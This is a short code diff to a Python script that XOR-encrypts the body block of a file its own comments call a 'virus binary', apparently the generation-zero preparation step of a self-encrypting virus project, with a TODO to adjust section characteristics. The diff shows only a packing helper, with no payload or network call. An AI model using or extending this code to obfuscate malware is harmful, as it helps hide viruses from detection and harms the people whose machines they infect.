@@ -1,5 +1,5 @@
-#VV Generation#0 body key xor encryptor
-#Usage format: python initial_encrypt.py [ file_path [cryptKey]]
+#VV Generation#0 preparation script
+#Usage format: python prepare_generation0.py [ file_path [cryptKey]]
 #Example: python initial_encrypt.py C:\vv.exe DEADBEEF
 
 #Feel free to modify values for your setup
@@ -27,6 +27,7 @@ def convertStrRepr2Bytes(par_str):
 
 #====================================================================================================
 def process(par_targetFilePath, par_cryptKey,par_markerValue):
+    #1.Encrypt main body
     #Read file contents
     #(Virus binary not so big => its OK to read it all)
     hFile=open(par_targetFilePath,"rb")
@@ -38,6 +39,9 @@ def process(par_targetFilePath, par_cryptKey,par_markerValue):
     #Encrypt with key
     for i in range(cryptBlockSize):
         fileContents[offset_cryptBlockBegin+i]^=par_cryptKey[i%len(par_cryptKey)]
+    
+    #2.Adjust section characteristics
+    #TODO
     #Write result
     hFile = open(par_targetFilePath, "wb")
     hFile.write(fileContents)
